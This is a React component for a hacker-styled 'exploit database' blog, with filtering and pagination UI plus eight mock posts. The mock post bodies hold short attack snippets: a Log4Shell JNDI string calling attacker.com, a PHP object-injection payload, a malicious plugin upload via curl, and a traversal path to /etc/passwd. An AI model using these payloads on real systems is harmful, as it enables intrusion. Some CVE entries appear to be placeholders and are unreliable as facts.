"use client"

import React, { useEffect, useState } from "react"
import "./Blog.css"

const mockPosts = [
  {
    _id: "1",
    title: "CVE-2023-4567 — RCE in NodeBB",
    slug: "cve-2023-4567-rce-in-nodebb",
    content: `## Overview\nRemote code execution in the plugin install endpoint.\n\n## Exploit\n\`\`\`bash\ncurl -F "plugin=@shell.tar.gz" http://target/admin/plugins\n\`\`\``,
    tags: ["CVE", "RCE", "NodeJS", "Web"],
    status: "published",
    severity: "critical",
    imageUrl: "https://placehold.co/500x300",
    excerpt:
      "Critical remote code execution vulnerability found in NodeBB plugin installation system allowing arbitrary file upload and execution.",
    createdAt: "2023-12-01T10:00:00Z",
    updatedAt: "2023-12-02T12:00:00Z",
  },
  {
    _id: "2",
    title: "CVE-2024-0112 — PHP Deserialization",
    slug: "cve-2024-0112-php-deserialization",
    content: `## Vulnerability\nPHP object injection in unserialize endpoint.\n\n## Exploit\n\`\`\`php\nO:8:"Exploit":1:{s:4:"cmd";s:9:"id; whoami";}\n\`\`\``,
    tags: ["CVE", "PHP", "Deserialization", "RCE"],
    status: "published",
    severity: "high",
    imageUrl: "https://placehold.co/500x300",
    excerpt:
      "PHP object injection vulnerability allowing remote code execution through unsafe deserialization of user input.",
    createdAt: "2024-03-15T08:30:00Z",
    updatedAt: "2024-03-15T08:45:00Z",
  },
  {
    _id: "3",
    title: "Dirty Pipe Privilege Escalation",
    slug: "dirty-pipe-privilege-escalation",
    content: `## Summary\nExploit CVE-2022-0847 to overwrite protected files and gain root.\n\n## PoC\n[Link to exploit](https://github.com/...).`,
    tags: ["Linux", "Kernel", "RCE", "PrivEsc"],
    status: "published",
    severity: "critical",
    imageUrl: "https://placehold.co/500x300",
    excerpt:
      "Linux kernel vulnerability allowing local privilege escalation by overwriting read-only files through pipe buffers.",
    createdAt: "2022-03-01T13:00:00Z",
    updatedAt: "2022-03-02T15:30:00Z",
  },
  {
    _id: "4",
    title: "CVE-2024-2050 — Remote PHP Eval via GET",
    slug: "cve-2024-2050-php-eval-get",
    content: `## Summary\nMisconfigured router in old CMS allows arbitrary eval via query string.\n\n## URL Example\n\`\`\`\nhttp://target/?q=phpinfo()\n\`\`\``,
    tags: ["CVE", "RCE", "PHP", "CMS"],
    status: "published",
    severity: "critical",
    imageUrl: "https://placehold.co/500x300",
    excerpt:
      "Critical vulnerability in legacy CMS allowing remote code execution through eval() function via GET parameters.",
    createdAt: "2024-07-01T10:00:00Z",
    updatedAt: "2024-07-01T10:30:00Z",
  },
  {
    _id: "5",
    title: "CVE-2021-44228 — Log4Shell RCE",
    slug: "cve-2021-44228-log4shell",
    content: `## Java JNDI Injection\n\nLog4j vulnerable to injection: \`\${jndi:ldap://attacker.com/exploit}\`\n\n## Impact\nFull remote code execution.`,
    tags: ["CVE", "RCE", "Java", "Log4j"],
    status: "published",
    severity: "critical",
    imageUrl: "https://placehold.co/500x300",
    excerpt:
      "The infamous Log4Shell vulnerability allowing remote code execution through JNDI injection in Apache Log4j.",
    createdAt: "2021-12-10T08:00:00Z",
    updatedAt: "2021-12-10T12:00:00Z",
  },
  {
    _id: "6",
    title: "Draft: CVE-2025-9999 — WIP Exploit",
    slug: "cve-2025-9999-wip",
    content: `Still analyzing...`,
    tags: ["CVE", "RCE", "WIP"],
    status: "draft",
    severity: "medium",
    imageUrl: "https://placehold.co/500x300",
    excerpt: "Work in progress vulnerability analysis - details coming soon.",
    createdAt: "2025-07-01T14:00:00Z",
    updatedAt: "2025-07-01T14:00:00Z",
  },
  {
    _id: "7",
    title: "CVE-2023-3456 — LFI to RCE via Log Poisoning",
    slug: "cve-2023-3456-lfi-rce",
    content: `## Step 1: LFI\nAccess /logs/app.log?file=../../../../etc/passwd\n\n## Step 2: Poison Log\nInject PHP into the logs and access via LFI path.`,
    tags: ["CVE", "RCE", "LFI", "PHP"],
    status: "published",
    severity: "high",
    imageUrl: "https://placehold.co/500x300",
    excerpt: "Local file inclusion vulnerability escalated to remote code execution through log poisoning techniques.",
    createdAt: "2023-06-01T09:00:00Z",
    updatedAt: "2023-06-01T09:30:00Z",
  },
  {
    _id: "8",
    title: "CVE-2020-0601 — Windows CryptoAPI Spoofing",
    slug: "cve-2020-0601-cryptoapi",
    content: `## Exploit\nFake SSL certs accepted by Windows.\n\n## Tool\nUse CurveBall.py to generate certs.`,
    tags: ["CVE", "Windows", "Crypto", "Spoofing"],
    status: "published",
    severity: "high",
    imageUrl: "https://placehold.co/500x300",
    excerpt: "Windows CryptoAPI vulnerability allowing certificate spoofing and man-in-the-middle attacks.",
    createdAt: "2020-01-15T06:00:00Z",
    updatedAt: "2020-01-15T08:00:00Z",
  },
]

const PAGE_SIZE = 6

const VulnBlog = () => {
  const [search, setSearch] = useState("")
  const [severity, setSeverity] = useState("all")
  const [tags, setTags] = useState([])
  const [filteredPosts, setFilteredPosts] = useState([])
  const [page, setPage] = useState(1)
  const [loading, setLoading] = useState(false)
  const [viewMode, setViewMode] = useState("grid")

  const allTags = Array.from(new Set(mockPosts.flatMap((p) => p.tags))).sort()

  useEffect(() => {
    filterPosts()
  }, [search, severity, tags])

  const filterPosts = () => {
    setLoading(true)
    setTimeout(() => {
      let posts = [...mockPosts]

      if (search) {
        const query = search.toLowerCase()
        posts = posts.filter(
          (post) =>
            post.title.toLowerCase().includes(query) ||
            (post.excerpt && post.excerpt.toLowerCase().includes(query)) ||
            post.tags.some((tag) => tag.toLowerCase().includes(query)),
        )
      }

      if (severity !== "all") {
        posts = posts.filter((post) => post.severity === severity)
      }

      if (tags.length > 0) {
        posts = posts.filter((post) => tags.some((tag) => post.tags.includes(tag)))
      }

      setFilteredPosts(posts)
      setPage(1)
      setLoading(false)
    }, 300)
  }

  const paginatedPosts = filteredPosts.slice((page - 1) * PAGE_SIZE, page * PAGE_SIZE)

  const toggleTag = (tag) => {
    setTags((prev) => (prev.includes(tag) ? prev.filter((t) => t !== tag) : [...prev, tag]))
  }

  const renderListPost = (item, index) => (
    <div className="list-card" key={item._id}>
      <div className="list-image">
        <img src={item.imageUrl || "/placeholder.svg"} alt={item.title} />
        <div className={`severity-indicator severity-${item.severity}`}>{item.severity?.toUpperCase()}</div>
      </div>
      <div className="list-content">
        <div className="list-header">
          <div className="card-meta">
            <span className="author">@h4cker</span>
            <span>{new Date(item.createdAt).toLocaleDateString()}</span>
          </div>
          <div className="cve-badge">EXPLOIT</div>
        </div>
        <h3 className="list-title">{item.title}</h3>
        <p className="list-excerpt">{item.excerpt}</p>
        <div className="list-footer">
          <div className="card-tags">
            {item.tags.slice(0, 4).map((tag) => (
              <span key={tag} className="tag">
                #{tag}
              </span>
            ))}
            {item.tags.length > 4 && <span className="tag-more">+{item.tags.length - 4}</span>}
          </div>
          <button className="read-more-btn">
            Read More <span className="arrow">→</span>
          </button>
        </div>
      </div>
    </div>
  )

  const renderPost = (item, index) => (
    <div
      className={`blog-card ${index === 0 ? "featured" : ""} ${index % 7 === 0 && index !== 0 ? "wide" : ""}`}
      key={item._id}
    >
      <div className="card-image">
        <img src={item.imageUrl || "/placeholder.svg"} alt={item.title} />
        <div className={`severity-indicator severity-${item.severity}`}>{item.severity?.toUpperCase()}</div>
        {item.status === "draft" && <div className="draft-badge">DRAFT</div>}
      </div>
      <div className="card-content">
        <div className="card-meta">
          <span className="author">@h4cker</span>
          <span>{new Date(item.createdAt).toLocaleDateString()}</span>
        </div>
        <div className="cve-badge">EXPLOIT</div>
        <h3 className="card-title">{item.title}</h3>
        <p className="card-excerpt">{item.excerpt}</p>
        <div className="card-tags">
          {item.tags.slice(0, 3).map((tag) => (
            <span key={tag} className="tag">
              #{tag}
            </span>
          ))}
          {item.tags.length > 3 && <span className="tag-more">+{item.tags.length - 3}</span>}
        </div>
        <button className="read-more-btn">
          Read More <span className="arrow">→</span>
        </button>
      </div>
    </div>
  )

  return (
    <div className="container">
      <div className="blog-header">
        <div className="terminal-prompt">root@exploit:~$</div>
        <h1 className="blog-title">EXPLOIT DATABASE</h1>
        <p className="blog-subtitle">Latest vulnerabilities and proof-of-concepts</p>
      </div>

      <div className="filters-section">
        <div className="search-bar">
          <span className="search-prompt">$</span>
          <input
            className="search-input"
            placeholder="search exploits..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
          <div className="search-cursor"></div>
        </div>

        <div className="filter-row">
          <div className="filter-group">
            <div className="filter-label">
              <span>🔥</span> SEVERITY
            </div>
            <div className="filter-options">
              {["all", "critical", "high", "medium", "low"].map((level) => (
                <button
                  key={level}
                  className={`filter-btn ${severity === level ? "active" : ""}`}
                  onClick={() => setSeverity(level)}
                >
                  {level.toUpperCase()}
                </button>
              ))}
            </div>
          </div>

          <div className="filter-group">
            <div className="filter-label">
              <span>🏷️</span> TAGS
            </div>
            <div className="filter-options">
              {allTags.slice(0, 8).map((tag) => (
                <button
                  key={tag}
                  className={`tag-btn ${tags.includes(tag) ? "active" : ""}`}
                  onClick={() => toggleTag(tag)}
                >
                  #{tag}
                </button>
              ))}
              {tags.length > 0 && (
                <button className="clear-btn" onClick={() => setTags([])}>
                  Clear
                </button>
              )}
            </div>
          </div>
        </div>
      </div>

      <div className="results-header">
        <span className="results-count">{filteredPosts.length} exploits found</span>
        <div className="view-toggle">
          <button className={`view-btn ${viewMode === "grid" ? "active" : ""}`} onClick={() => setViewMode("grid")}>
            Grid
          </button>
          <button className={`view-btn ${viewMode === "list" ? "active" : ""}`} onClick={() => setViewMode("list")}>
            List
          </button>
        </div>
      </div>

      {loading ? (
        <div className="loading show">
          <div className="spinner"></div>
          Scanning for vulnerabilities...
        </div>
      ) : filteredPosts.length === 0 ? (
        <div className="no-results">
          <div className="terminal-window">
            <div className="terminal-header">
              <div className="terminal-dot red"></div>
              <div className="terminal-dot yellow"></div>
              <div className="terminal-dot green"></div>
              <div className="terminal-title">exploit.sh</div>
            </div>
            <div className="terminal-content">
              <div className="terminal-line">
                <span className="terminal-prompt">$</span>
                <span className="terminal-text">find . -name "*exploit*"</span>
              </div>
              <div className="terminal-line">
                <span className="terminal-text">No exploits found matching your criteria</span>
              </div>
              <div className="terminal-line">
                <span className="terminal-prompt">$</span>
                <span className="terminal-text">Try different search terms</span>
              </div>
            </div>
          </div>
        </div>
      ) : (
        <div className={viewMode === "grid" ? "blog-grid" : "blog-list"}>
          {paginatedPosts.map(viewMode === "grid" ? renderPost : renderListPost)}
        </div>
      )}

      {filteredPosts.length > PAGE_SIZE && (
        <div className="pagination">
          <div className="pagination-info">
            <span>📊</span>
            Showing {(page - 1) * PAGE_SIZE + 1}-{Math.min(page * PAGE_SIZE, filteredPosts.length)} of{" "}
            {filteredPosts.length}
          </div>
          <div className="pagination-controls">
            <button className="pagination-btn" disabled={page === 1} onClick={() => setPage(page - 1)}>
              ← Previous
            </button>
            <div className="page-numbers">
              {Array.from({ length: Math.ceil(filteredPosts.length / PAGE_SIZE) }, (_, i) => i + 1)
                .filter((p) => p === 1 || p === Math.ceil(filteredPosts.length / PAGE_SIZE) || Math.abs(p - page) <= 1)
                .map((p, i, arr) => (
                  <React.Fragment key={p}>
                    {i > 0 && arr[i - 1] !== p - 1 && <span className="page-btn ellipsis">...</span>}
                    <button className={`page-btn ${page === p ? "active" : ""}`} onClick={() => setPage(p)}>
                      {p}
                    </button>
                  </React.Fragment>
                ))}
            </div>
            <button
              className="pagination-btn"
              disabled={page === Math.ceil(filteredPosts.length / PAGE_SIZE)}
              onClick={() => setPage(page + 1)}
            >
              Next →
            </button>
          </div>
        </div>
      )}
    </div>
  )
}

export default VulnBlog
